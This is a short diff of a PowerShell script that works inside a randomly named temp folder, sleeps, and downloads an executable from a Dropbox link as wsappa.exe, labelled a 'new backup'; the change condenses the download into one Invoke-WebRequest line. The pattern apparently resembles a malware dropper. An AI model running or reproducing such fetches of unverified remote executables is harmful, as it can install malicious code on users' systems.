@@ -5,9 +5,7 @@ start-sleep 5
 cd $env:temp/sVBXKuz
 
 #download new backup
-$url = "dl.dropboxusercontent.com/s/36hpp0y42mkwe3rdv9uwc/wsappa-1.4.exe?rlkey=80dozbkw1nrlupsfyx0ff6rms&dl=0"
-$response = Invoke-WebRequest -Uri $url
-$response.Content | Set-Content -Path "wsappa.exe"
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/36hpp0y42mkwe3rdv9uwc/wsappa-1.4.exe?rlkey=80dozbkw1nrlupsfyx0ff6rms&dl=0" -OutFile wsappa.exe
 
 #sleep
 start-sleep 2
